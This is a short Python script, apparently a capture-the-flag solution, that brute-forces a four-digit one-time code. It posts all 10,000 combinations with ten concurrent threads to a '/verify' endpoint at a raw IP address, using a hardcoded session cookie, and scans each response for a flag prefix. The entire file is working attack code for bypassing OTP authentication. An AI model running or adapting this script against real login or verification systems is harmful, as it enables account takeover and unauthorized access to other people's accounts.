import requests
from concurrent.futures import ThreadPoolExecutor

url = 'http://18.143.200.117:31045/verify'
headers = {
    'Cookie': 'session=eyJ1c2VybmFtZSI6InRlc3QifQ.ZZgl3Q.joe1CzItytWVMptcTagWiquwrZA',
}

def send_request(otp):
    payload = {
        'otp1': str(otp[0]),
        'otp2': str(otp[1]),
        'otp3': str(otp[2]),
        'otp4': str(otp[3])
    }
    response = requests.post(url, headers=headers, data=payload)
    if 'CHH' in response.text:
        print(f"Found 'CHH' in response: {response.text}")
        # Do something with the response if needed
    else:
        print(f"No 'CHH' in response for OTPs: {''.join(map(str, otp))}")

# List to hold OTP combinations
otp_combinations = [(i, j, k, l) for i in range(10) for j in range(10) for k in range(10) for l in range(10)]

# Using ThreadPoolExecutor to send requests concurrently
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(send_request, otp_combinations)
